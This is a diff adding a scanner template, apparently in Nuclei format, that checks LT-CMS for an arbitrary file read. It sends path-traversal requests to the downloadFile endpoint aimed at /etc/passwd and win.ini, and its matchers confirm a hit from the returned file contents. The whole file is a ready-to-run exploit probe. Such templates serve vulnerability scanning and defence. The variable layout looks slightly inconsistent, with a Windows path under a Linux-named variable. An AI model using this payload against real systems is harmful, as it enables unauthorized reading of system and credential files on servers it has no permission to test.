@@ -1,0 +1,33 @@
+id: poc-yaml-wanglongcn-ltcms-downloadfile-read-any
+info:
+  name: LT-CMS Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    LT-CMS suffers from an arbitrary file read vulnerability via the downloadFile endpoint.
+  reference:
+    - https://fofa.so
+
+variables:
+  r_data_linux:
+    - "../../../../../../../../../../../../../../../../../etc/passwd"
+    - "c:/windows/win.ini"
+
+http:
+  - method: GET
+    path:
+      - "/api/file/downloadFile?file={{r_data_linux}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
